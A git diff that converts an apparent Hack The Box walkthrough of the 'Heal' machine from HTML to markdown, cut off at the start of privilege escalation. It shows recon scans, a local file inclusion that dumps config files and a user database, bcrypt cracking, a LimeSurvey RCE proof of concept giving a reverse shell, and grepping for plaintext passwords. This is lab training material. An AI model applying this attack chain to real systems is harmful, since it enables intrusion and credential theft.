@@ -1,74 +1,7 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Home Page</title>
-    <link rel="stylesheet" href="/src/styles.css">
-</head>
-
-<script>
-    document.addEventListener('DOMContentLoaded', function () {
-        const lateralIndex = document.getElementById('lateralIndex');
-        const menuButton = document.querySelector('.menu-button');
-        const dropdownToggles = document.querySelectorAll('.dropdown-toggle');
-        const dropdownMenus = document.querySelectorAll('.dropdown-menu');
-
-        lateralIndex.classList.remove('open'); // Ensures it's hidden on load (off-screen)
-        dropdownMenus.forEach(menu => menu.style.display = 'none'); // Hide dropdowns initially
-
-        menuButton.addEventListener('click', function () {
-            lateralIndex.classList.toggle('open'); // Toggle the 'open' class to slide the menu
-        });
-
-        dropdownToggles.forEach(toggle => {
-            toggle.addEventListener('click', function () {
-                const dropdownMenu = this.nextElementSibling; // Get the next <ul> (the dropdown)
-                if (dropdownMenu.style.display === 'block') {
-                    dropdownMenu.style.display = 'none';
-                } else {
-                    dropdownMenu.style.display = 'block';
-                }
-            });
-        });
-    });
-
-</script>
-
-<body>
-    <!-- Upper Menu -->
-    <div class="upper-menu">
-        <button class="menu-button">></button>
-        <nav>
-            <a href="/">Homepage</a>
-            <a href="/walkthrough/">Walkthroughs</a>
-            <a href="/tools">Tools</a>
-            <a href="/attacks/">Attacks</a>
-            <a href="/protocols">Protocols</a>
-            <a href="/other">Other</a>
-        </nav>
-    </div>
-
-    <!-- Lateral Index -->
-    <div class="lateral-index" id="lateralIndex">
-        <ul id="indexList">
-            <a href="#recon"><li class="index-item">Recon</li></a>
-            <li class="index-item">
-                <span class="dropdown-toggle">Attack</span>
-                <ul class="dropdown-menu">
-                    <a href="#user"><li>Gainig access</li></a>
-                    <a href="#privesc"><li>Privilege Scalation</li></a>
-                </ul>
-            </li>
-        </ul>
-    </div>
-
-
-    <div class="main-content">
-<h1>Heal</h1>
-<h2 id="recon">Recon</h2>
-<pre><code>┌──(oriol㉿zero)-[~/htb/heal]
-└─$ nmap -p- --min-rate 10000 -T4 $target 1&gt; ports.txt &amp;&amp; echo &quot;All discovered open ports:&quot; &amp;&amp; cat ports.txt &amp;&amp; nmap -sC -sV -p$(tail -n +6 ports.txt | head -n -2 | cut -d ' ' -f 1 | cut -d '/' -f 1 | sed -z 's/\n/,/g') $target | tee nmap.txt
+## Recon
+```
+┌──(oriol㉿zero)-[~/htb/heal]
+└─$ nmap -p- --min-rate 10000 -T4 $target 1> ports.txt && echo "All discovered open ports:" && cat ports.txt && nmap -sC -sV -p$(tail -n +6 ports.txt | head -n -2 | cut -d ' ' -f 1 | cut -d '/' -f 1 | sed -z 's/\n/,/g') $target | tee nmap.txt
 All discovered open ports:
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-08 19:10 CEST
 Nmap scan report for 10.10.11.46
@@ -95,21 +28,28 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds
-</code></pre>
-<p>Only has ssh and http.
-It uses nginx version 1.18.0 as a web server.</p>
-<p>The web returns a redirect to the domain <strong>heal.htb</strong></p>
-<pre><code>|_http-title: Did not follow redirect to http://heal.htb/
-</code></pre>
-<p>So, let's add the heal.htb domain on the hosts file.</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/heal]
+```
+
+Only has ssh and http.
+It uses nginx version 1.18.0 as a web server.
+
+The web returns a redirect to the domain **heal.htb**
+```
+|_http-title: Did not follow redirect to http://heal.htb/
+```
+
+So, let's add the heal.htb domain on the hosts file.
+```
+┌──(oriol㉿zero)-[~/htb/heal]
 └─$ cat /etc/hosts
 127.0.0.1       localhost
 127.0.1.1       zero
 10.10.11.46     heal.htb www.heal.htb
-</code></pre>
-<p>Now, let's try to use <code>nmap</code> to identify the technologies that the web uses, the same could be done with <code>whatweb</code></p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/heal]
+```
+
+Now, let's try to use `nmap` to identify the technologies that the web uses, the same could be done with `whatweb`
+```
+┌──(oriol㉿zero)-[~/htb/heal]
 └─$ nmap -sC -sV -p 80 -Pn heal.htb    
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-08 19:20 CEST
 Nmap scan report for heal.htb (10.10.11.46)
@@ -123,93 +63,102 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 9.32 seconds
-
+                                                                                                                                                                                                                                            
 ┌──(oriol㉿zero)-[~/htb/heal]
 └─$ whatweb http://heal.htb    
 http://heal.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.46], Script, Title[Heal], X-Powered-By[Express], nginx[1.18.0]
-</code></pre>
-<p>Whatweb says it is powered by Express, which is a web framework for <strong>node.js</strong>, a part from that, no additional technologies detected.</p>
-<p>Let's do some fuzzing.</p>
-<p>First, web fuzzing:</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/heal]
+```
+
+Whatweb says it is powered by Express, which is a web framework for **node.js**, a part from that, no additional technologies detected.
+
+Let's do some fuzzing.
+
+First, web fuzzing:
+```
+┌──(oriol㉿zero)-[~/htb/heal]
 └─$ ffuf -u http://heal.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -t 100
 
         /'___\  /'___\           /'___\       
-        /\ \__/ /\ \__/  __  __  /\ \__/       
-        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-            \ \_\   \ \_\  \ \____/  \ \_\       
-            \/_/    \/_/   \/___/    \/_/       
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
 
-        v2.1.0-dev
+       v2.1.0-dev
 ________________________________________________
 
-    :: Method           : GET
-    :: URL              : http://heal.htb/FUZZ
-    :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-    :: Follow redirects : true
-    :: Calibration      : false
-    :: Timeout          : 10
-    :: Threads          : 100
-    :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Method           : GET
+ :: URL              : http://heal.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 100
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
 # license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 1672, Words: 330, Lines: 43, Duration: 861ms]
 # directory-list-2.3-medium.txt [Status: 200, Size: 1672, Words: 330, Lines: 43, Duration: 2091ms]
 :: Progress: [220560/220560] :: Job [1/1] :: 221 req/sec :: Duration: [0:02:05] :: Errors: 0 ::
-</code></pre>
-<p>No luck... Now subdomain fuzzing:</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/heal]
-└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H &quot;Host: FUZZ.heal.htb&quot; -u http://heal.htb/ -mc 200
+```
+
+No luck... Now subdomain fuzzing:
+```
+┌──(oriol㉿zero)-[~/htb/heal]
+└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.heal.htb" -u http://heal.htb/ -mc 200
 
         /'___\  /'___\           /'___\       
-        /\ \__/ /\ \__/  __  __  /\ \__/       
-        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-            \ \_\   \ \_\  \ \____/  \ \_\       
-            \/_/    \/_/   \/___/    \/_/       
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
 
-        v2.1.0-dev
+       v2.1.0-dev
 ________________________________________________
 
-    :: Method           : GET
-    :: URL              : http://heal.htb/
-    :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-    :: Header           : Host: FUZZ.heal.htb
-    :: Follow redirects : false
-    :: Calibration      : false
-    :: Timeout          : 10
-    :: Threads          : 40
-    :: Matcher          : Response status: 200
+ :: Method           : GET
+ :: URL              : http://heal.htb/
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Header           : Host: FUZZ.heal.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200
 ________________________________________________
 
 api                     [Status: 200, Size: 12515, Words: 469, Lines: 91, Duration: 71ms]
 API                     [Status: 200, Size: 12515, Words: 469, Lines: 91, Duration: 49ms]
 :: Progress: [220560/220560] :: Job [1/1] :: 943 req/sec :: Duration: [0:04:22] :: Errors: 0 ::
-</code></pre>
-<p><strong>api</strong> subdomain encountered</p>
-<p>Let's do a web page fuzzing on the new api subdomain discovered (after adding it to the hosts file)</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/heal]
+```
+
+**api** subdomain encountered
+
+Let's do a web page fuzzing on the new api subdomain discovered (after adding it to the hosts file)
+```
+┌──(oriol㉿zero)-[~/htb/heal]
 └─$ ffuf -u http://api.heal.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -t 100
 
         /'___\  /'___\           /'___\       
-        /\ \__/ /\ \__/  __  __  /\ \__/       
-        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-            \ \_\   \ \_\  \ \____/  \ \_\       
-            \/_/    \/_/   \/___/    \/_/       
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
 
-        v2.1.0-dev
+       v2.1.0-dev
 ________________________________________________
 
-    :: Method           : GET
-    :: URL              : http://api.heal.htb/FUZZ
-    :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-    :: Follow redirects : true
-    :: Calibration      : false
-    :: Timeout          : 10
-    :: Threads          : 100
-    :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Method           : GET
+ :: URL              : http://api.heal.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 100
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
 # directory-list-2.3-medium.txt [Status: 200, Size: 12515, Words: 469, Lines: 91, Duration: 475ms]
@@ -227,41 +176,46 @@ ________________________________________________
 download                [Status: 401, Size: 26, Words: 2, Lines: 1, Duration: 1903ms]
 #                       [Status: 200, Size: 12515, Words: 469, Lines: 91, Duration: 2006ms]
 :: Progress: [220560/220560] :: Job [1/1] :: 222 req/sec :: Duration: [0:02:10] :: Errors: 0 ::
-</code></pre>
-<p>When entering to the api subdomain, we can see that it uses <strong>Ruby On Rails</strong> and it's version</p>
-<p><img src="src/heal04.png"/></p>
-<p>I will use <code>katana</code> to do some web scrapping, I feel that there is some more pages that the wordlist didn't cover</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/heal]
+```
+
+When entering to the api subdomain, we can see that it uses **Ruby On Rails** and it's version
+![[heal04.png]]
+
+I will use `katana` to do some web scrapping, I feel that there is some more pages that the wordlist didn't cover
+```
+┌──(oriol㉿zero)-[~/htb/heal]
 └─$ katana -u http://heal.htb    
 
-    __        __                
-    / /_____ _/ /____ ____  ___ _
-    /  '_/ _  / __/ _  / _ \/ _  /
+   __        __                
+  / /_____ _/ /____ ____  ___ _
+ /  '_/ _  / __/ _  / _ \/ _  /
 /_/\_\\_,_/\__/\_,_/_//_/\_,_/                                                   
 
                 projectdiscovery.io
 
 [INF] Current katana version v1.1.2 (latest)
-[INF] Started standard crawling for =&gt; http://heal.htb
+[INF] Started standard crawling for => http://heal.htb
 http://heal.htb
 http://heal.htb/static/js/main.chunk.js
 http://heal.htb/static/js/bundle.js
 http://heal.htb/manifest.json
 http://heal.htb/static/js/0.chunk.js
-</code></pre>
-<p>There is a bunch of json I will retry a web scrapping, but this time with the <code>-jc</code> flag to also read the json and discover new endpoints.</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/heal]
+```
+
+There is a bunch of json I will retry a web scrapping, but this time with the `-jc` flag to also read the json and discover new endpoints.
+```
+┌──(oriol㉿zero)-[~/htb/heal]
 └─$ katana -u http://heal.htb -jc
 
-    __        __                
-    / /_____ _/ /____ ____  ___ _
-    /  '_/ _  / __/ _  / _ \/ _  /
+   __        __                
+  / /_____ _/ /____ ____  ___ _
+ /  '_/ _  / __/ _  / _ \/ _  /
 /_/\_\\_,_/\__/\_,_/_//_/\_,_/                                                   
 
                 projectdiscovery.io
 
 [INF] Current katana version v1.1.2 (latest)
-[INF] Started standard crawling for =&gt; http://heal.htb
+[INF] Started standard crawling for => http://heal.htb
 http://heal.htb
 http://heal.htb/static/js/bundle.js
 http://heal.htb/static/js/main.chunk.js
@@ -607,77 +561,88 @@ http://heal.htb/home/ralph/resume-builder/src/components/Error.js
 http://heal.htb/home/ralph/resume-builder/src/App.js
 http://heal.htb/static/node_modules/style-loader/lib/addStyles.js
 http://heal.htb/static/node_modules/css-loader/dist/runtime/api.js
-</code></pre>
-<p>Yes! It also returned the api endpoints also!
+```
+
+Yes! It also returned the api endpoints also!
 This are some interesting endpoints the crawler discovered:
-<ul>
-    <li>http://heal.htb/static</li>
-    <li>http://heal.htb/building</li>
-    <li>http://heal.htb/utils</li>
-    <li>http://heal.htb/timers-browserify</li>
-    <li>http://heal.htb/process</li>
-    <li>http://heal.htb/webpack</li>
-    <li>http://heal.htb/helpers</li>
-    <li>http://heal.htb/buffer</li>
-    <li><strong>http://api.heal.htb/download?filename=</strong></li>
-    <li><strong>http://take-survey.heal.htb/index.php/552933?lang=en</strong></li>
-    <li><strong>http://heal.htb/home/ralph/resume-builder/src/index.js</strong></li>
-    <li><strong>http://api.heal.htb/signin</strong></li>
-    <li><strong>http://api.heal.htb/signup</strong></li>
-</ul>
-<p>The last 5 seem very promising.
-The download one could be exploited with a <strong>lfi</strong> and the take-survey is a whole new subdomain.</p>
-<p>After adding the new subdomain to the hosts file, I enter and there is a LimeSurvey page, unlucky it doesn't show any version, not even <code>whatweb</code> shows the version
-<p><img src="src/heal01.png"/></p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/heal]
+- http://heal.htb/static
+- http://heal.htb/building
+- http://heal.htb/utils
+- http://heal.htb/timers-browserify
+- http://heal.htb/process
+- http://heal.htb/webpack
+- http://heal.htb/helpers
+- http://heal.htb/buffer
+- **http://api.heal.htb/download?filename=
+- **http://take-survey.heal.htb/index.php/552933?lang=en
+- **http://heal.htb/home/ralph/resume-builder/src/index.js
+- **http://api.heal.htb/signin
+- **http://api.heal.htb/signup
+
+The last 5 seem very promising.
+The download one could be exploited with a **lfi** and the take-survey is a whole new subdomain.
+
+After adding the new subdomain to the hosts file, I enter and there is a LimeSurvey page, unlucky it doesn't show any version, not even `whatweb` shows the version
+![[heal01.png]]
+
+```
+┌──(oriol㉿zero)-[~/htb/heal]
 └─$ whatweb http://take-survey.heal.htb/index.php/
 http://take-survey.heal.htb/index.php/ [200 OK] Cookies[LS-ZNIDJBOXUNKXWTIP], Country[RESERVED][ZZ], Email[ralph@heal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[LS-ZNIDJBOXUNKXWTIP], IP[10.10.11.46], JQuery, Lime-Survey, MetaGenerator[LimeSurvey http://www.limesurvey.org], Script[text/javascript], Title[Survey][Title element contains newline(s)!], X-UA-Compatible[IE=edge], nginx[1.18.0]
-</code></pre>
-<p>I sign up on the page (I don't try to do a SQL injection).
-Seems to be a resume builder:</p>
-<p><img src="src/heal02.png"/></p>
-<p>At the bottom, the <strong>Export as pdf</strong> button triggers the download? potential LFI</p>
-<p><img src="src/heal03.png"/></p>
-<h2>Attack</h2>
-<h3 id="user">Gaining access</h3>
-<p>Continuing the recon phase, I bring the packet captured of the <code>/download?filename</code> endpoint and variable to the repeater.
-After trying for some time, I finally get the LFI. Note that I used the GET petition, not the OPTIONS one, seen on the last image.</p>
-<p><img src="src/heal05.png"/></p>
-<p>I see 2 interesting users: <strong>ron</strong> and <strong>ralph</strong>
+```
+
+I sign up on the page (I don't try to do a SQL injection).
+Seems to be a resume builder:
+![[heal02.png]]
+
+At the bottom, the **Export as pdf** button triggers the download? potential LFI
+![[heal03.png]]
+## Attack
+### Gaining access
+Continuing the recon phase, I bring the packet captured of the `/download?filename` endpoint and variable to the repeater.
+After trying for some time, I finally get the LFI. Note that I used the GET petition, not the OPTIONS one, seen on the last image.
+![[heal05.png]]
+
+I see 2 interesting users: **ron** and **ralph**
 I think we can get some more information exploiting this LFI. 
-A quick search I see that the ruby on rails configuration is located on the <code>config/application.rb</code> file.
-</p>
-<ul>
-    <li><p>- https://guides.rubyonrails.org/configuring.html</p></p></li>
-</ul>
-<p><img src="src/heal06.png"/></p>
-<p>On this file there's information about the application, nothing I already knew.
+A quick search I see that the ruby on rails configuration is located on the `config/application.rb` file.
+- https://guides.rubyonrails.org/configuring.html
+
+![[heal06.png]]
+
+On this file there's information about the application, nothing I already knew.
 On this page there's all the files on the config directory listed:
-<ul>
-    <li><p>https://useful.codes/the-config-directory-in-ruby-on-rails/</p></p></li>
-</ul>
-<p>The <code>routes.rb</code> file contains the application's routes.</p>
-<p><img src="src/heal07.png"/></p>
-<p>And on the <code>database.yml</code> file we can see the database connection:</p>
-<p><img src="src/heal08.png"/></p>
-<p>At the bottom of the response, we see that the database is a <strong>sqlite3</strong> and it's location: <code>storage/development.sqlite3</code> So I try to access it:</p>
-<p><img src="src/heal09.png"/></p>
-<p>Yes, now we have the database in a text form, for easily manipulating it, I select the database text and do right click and save to a file. And now I have the sqlite3 file on my local computer.</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/heal]
+- https://useful.codes/the-config-directory-in-ruby-on-rails/
+
+The `routes.rb` file contains the application's routes.
+![[heal07.png]]
+
+And on the `database.yml` file we can see the database connection:
+![[heal08.png]]
+
+At the bottom of the response, we see that the database is a **sqlite3** and it's location: `storage/development.sqlite3` So I try to access it:
+![[heal09.png]]
+
+Yes, now we have the database in a text form, for easily manipulating it, I select the database text and do right click and save to a file. And now I have the sqlite3 file on my local computer.
+```
+┌──(oriol㉿zero)-[~/htb/heal]
 └─$ sqlite3 database.sqlite3
 SQLite version 3.46.1 2024-08-13 09:16:08
-Enter &quot;.help&quot; for usage hints.
-sqlite&gt; .tables
+Enter ".help" for usage hints.
+sqlite> .tables
 ar_internal_metadata  token_blacklists    
 schema_migrations     users               
-sqlite&gt; select * from users;
+sqlite> select * from users;
 1|ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG|2024-09-27 07:49:31.614858|2024-09-27 07:49:31.614858|Administrator|ralph|1
 2|sq@sq.sq|$2a$12$4xmhAalWCE8g/tKfv3x6JOhdqi2Y5AGxSrJJDo0I7.hR6WmASBZmq|2025-04-14 06:20:53.120106|2025-04-14 06:20:53.120106|sq|sq|0
 3|test02@gmail.com|$2a$12$Nq6YXZ19yMH0B/uW2HNfsOIlHPQrMaW9U5SEWxPVqEy1AraqHSFD2|2025-04-14 09:10:25.412684|2025-04-14 09:10:25.412684|test02|test02|0
-</code></pre>
-<p>We have the ralph user's password hash. The test02 is mine and the sq is maybe from another user working on the machine(?)</p>
-<p>A quick look at the hashcat wiki and I know that the hash type is a <code>bcrypt</code>. So let's try to crack it with <code>hashcat</code></p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/heal]
+```
+
+We have the ralph user's password hash. The test02 is mine and the sq is maybe from another user working on the machine(?)
+
+A quick look at the hashcat wiki and I know that the hash type is a `bcrypt`. So let's try to crack it with `hashcat`
+```
+┌──(oriol㉿zero)-[~/htb/heal]
 └─$ hashcat -m 3200 ralph_hash.txt  /usr/share/wordlists/rockyou.txt.gz -w 3 -S
 
 hashcat (v6.2.6) starting
@@ -710,7 +675,7 @@ Dictionary cache built:
 * Runtime...: 1 sec
 
 $2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369
-
+                                                          
 Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
@@ -727,16 +692,19 @@ Rejected.........: 0/576 (0.00%)
 Restore.Point....: 432/14344387 (0.00%)
 Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3968-4096
 Candidate.Engine.: Host Generator + PCIe
-Candidates.#1....: jenny -&gt; barney
+Candidates.#1....: jenny -> barney
 Hardware.Mon.#1..: Util: 86%
 
 Started: Mon Apr 14 12:21:35 2025
 Stopped: Mon Apr 14 12:21:59 2025
-</code></pre>
-<p>User: <strong>ralph</strong>
-Password: <strong>147258369</strong></p>
-<p>Unlucky, this isn't the ssh password</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/heal]
+```
+
+User: **ralph**
+Password: **147258369**
+
+Unlucky, this isn't the ssh password
+```
+┌──(oriol㉿zero)-[~/htb/heal]
 └─$ ssh ralph@heal.htb                         
 The authenticity of host 'heal.htb (10.10.11.46)' can't be established.
 ED25519 key fingerprint is SHA256:/VqroO/Kmxq00rboKFY9TylfAkNdJOiWIOBhnIA4VMs.
@@ -745,19 +713,24 @@ Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added 'heal.htb' (ED25519) to the list of known hosts.
 ralph@heal.htb's password: 
 Permission denied, please try again.
-</code></pre>
-<p>I log in onto the heal.htb site with the ralph admin but I don't see anything special I can do... And on the recon phase I didn't detect any admin portal or something like that, and on the <code>routes.rb</code> file also there's no administration panel route.</p>
-<p>Where I didn't search is on the <code>take-survey</code> domain. Looking at the internet I see that the admin panel for lime survey is the admin page. And it works:</p>
-<p><img src="src/heal10.png"/></p>
-<p>It works and I have access to the control panel:</p>
-<p><img src="src/heal11.png"/></p>
-<p>We can see the version of LimeSurvey on here: <strong>Community Edition Version 6.6.4</strong></p>
-<p>I see a very interesting POC:</p>
-<ul>
-    <li><p>https://github.com/godylockz/CVE-2021-44967</p></li>
-</ul>
-<p>I execute it:</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/heal]
+```
+
+I log in onto the heal.htb site with the ralph admin but I don't see anything special I can do... And on the recon phase I didn't detect any admin portal or something like that, and on the `routes.rb` file also there's no administration panel route.
+
+Where I didn't search is on the `take-survey` domain. Looking at the internet I see that the admin panel for lime survey is the admin page. And it works:
+![[heal10.png]]
+
+It works and I have access to the control panel:
+![[heal11.png]]
+
+We can see the version of LimeSurvey on here: **Community Edition Version 6.6.4**
+
+I see a very interesting POC:
+- https://github.com/godylockz/CVE-2021-44967
+
+I execute it:
+```
+┌──(oriol㉿zero)-[~/htb/heal]
 └─$ git clone https://github.com/godylockz/CVE-2021-44967.git
 Cloning into 'CVE-2021-44967'...
 remote: Enumerating objects: 4, done.
@@ -765,8 +738,10 @@ remote: Counting objects: 100% (4/4), done.
 remote: Compressing objects: 100% (4/4), done.
 remote: Total 4 (delta 0), reused 4 (delta 0), pack-reused 0 (from 0)
 Receiving objects: 100% (4/4), done.
-</code></pre>
-<pre><code>┌──(oriol㉿zero)-[~/htb/heal/CVE-2021-44967]
+```
+
+```
+┌──(oriol㉿zero)-[~/htb/heal/CVE-2021-44967]
 └─$ python3 limesurvey_rce.py -t http://take-survey.heal.htb -u 'ralph' -p '147258369'
 [*] Authenticating ...
 [+] Login successful!
@@ -776,23 +751,29 @@ Receiving objects: 100% (4/4), done.
 listening on [any] 4444 ...
 connect to [10.10.14.61] from (UNKNOWN) [10.10.11.46] 51912
 Linux heal 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
-    14:41:19 up 10:39,  0 users,  load average: 0.01, 0.02, 0.01
+ 14:41:19 up 10:39,  0 users,  load average: 0.01, 0.02, 0.01
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 $ whoami
 www-data
-</code></pre>
-<p>And we are in!</p>
-<p>I spawn a bash shell with the python command:</p>
-<pre><code>$ python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot;
-</code></pre>
-<p>I don't see the user flag, meaning we still have to pivot to some other user to get it.</p>
-<p>I see that there is a lot of services running on localhost:</p>
-<pre><code>www-data@heal:~$ netstat -tulnp  
+```
+
+And we are in!
+
+I spawn a bash shell with the python command:
+```
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
+```
+
+I don't see the user flag, meaning we still have to pivot to some other user to get it.
+
+I see that there is a lot of services running on localhost:
+```
+www-data@heal:~$ netstat -tulnp  
 netstat -tulnp
 (Not all processes could be identified, non-owned process info
-    will not be shown, you would have to be root to see it all.)
+ will not be shown, you would have to be root to see it all.)
 Active Internet connections (only servers)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
 tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
@@ -817,10 +798,13 @@ udp        0      0 0.0.0.0:33099           0.0.0.0:*                           
 udp        0      0 127.0.0.1:8600          0.0.0.0:*                           -                   
 udp6       0      0 :::5353                 :::*                                -                   
 udp6       0      0 :::52461                :::*                                -
-</code></pre>
-<p>But I can't map those ports on my local machine via ssh tunnel, as I don't have any ssh credential... The same goes for using <code>sudo -l</code>. I take note of this ports as very probably I will be using for privilege escalation once I got the user credentials.</p>
-<p>So my safe bet right now should be checking the web files to see if there is some plain text password.</p>
-<pre><code>www-data@heal:~$ cd 
+```
+
+But I can't map those ports on my local machine via ssh tunnel, as I don't have any ssh credential... The same goes for using `sudo -l`. I take note of this ports as very probably I will be using for privilege escalation once I got the user credentials.
+
+So my safe bet right now should be checking the web files to see if there is some plain text password.
+```
+www-data@heal:~$ cd 
 cd 
 www-data@heal:~$ ls
 ls
@@ -834,44 +818,59 @@ README.md    docs   locale     psalm-all.xml     tmp
 SECURITY.md  editor   modules     psalm-strict.xml  upload
 admin      gulpfile.js  node_modules     psalm.xml       vendor
 application  index.php   open-api-gen.php  setdebug.php
-</code></pre>
-<p>I use this command to put all the lines that contain the string <em>password</em> in a separate text file.</p>
-<pre><code>www-data@heal:~/limesurvey$ find . -type f -exec file {} + | grep -i 'text' | cut -d: -f1 | xargs grep -i 'password' &gt; passwords.txt
-&lt; -d: -f1 | xargs grep -i 'password' &gt; passwords.txt
-</code></pre>
-<p>Also, it doesn't seem the www-data user has permissions to read the ruby on rails app directory, I searched for the database and I don't see it.</p>
-<pre><code>www-data@heal:~/limesurvey$ find / -iname 'development.sqlite3' 2&gt;/dev/null
-find / -iname 'development.sqlite3' 2&gt;/dev/null
-</code></pre>
-<p>On the password grep I see this:</p>
-<pre><code>   'password' =&gt; 'AdmiDi0_pA$$w0rd',
-</code></pre>
-<p>So, I try to ssh into the host with the password gotten and with the ralph user.</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/heal]
+```
+
+I use this command to put all the lines that contain the string _password_ in a separate text file.
+```
+www-data@heal:~/limesurvey$ find . -type f -exec file {} + | grep -i 'text' | cut -d: -f1 | xargs grep -i 'password' > passwords.txt
+< -d: -f1 | xargs grep -i 'password' > passwords.txt
+```
+
+Also, it doesn't seem the www-data user has permissions to read the ruby on rails app directory, I searched for the database and I don't see it.
+```
+www-data@heal:~/limesurvey$ find / -iname 'development.sqlite3' 2>/dev/null
+find / -iname 'development.sqlite3' 2>/dev/null
+```
+
+On the password grep I see this:
+```
+   'password' => 'AdmiDi0_pA$$w0rd',
+```
+
+So, I try to ssh into the host with the password gotten and with the ralph user.
+```
+┌──(oriol㉿zero)-[~/htb/heal]
 └─$ ssh ralph@heal.htb        
 ralph@heal.htb's password: 
 Permission denied, please try again.
 ralph@heal.htb's password: 
 Permission denied, please try again.
 ralph@heal.htb's password:
-</code></pre>
-<p>Still doesn't work... I will try with the <strong>ron</strong> user found earlier on the <code>/etc/passwd</code> file</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/heal]
+```
+
+Still doesn't work... I will try with the **ron** user found earlier on the `/etc/passwd` file
+```
+┌──(oriol㉿zero)-[~/htb/heal]
 └─$ ssh ron@heal.htb
 ron@heal.htb's password: 
 Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
-</code></pre>
-<p>Yes!</p>
-<h3 id="privesc" >Privilege escalation</h3>
-<p>The user ron doesn't have sudo permissons...</p>
-<pre><code>ron@heal:~$ sudo -l
+```
+
+Yes!
+
+### Privilege escalation
+The user ron doesn't have sudo permissons...
+```
+ron@heal:~$ sudo -l
 [sudo] password for ron: 
 Sorry, user ron may not run sudo on heal.
-</code></pre>
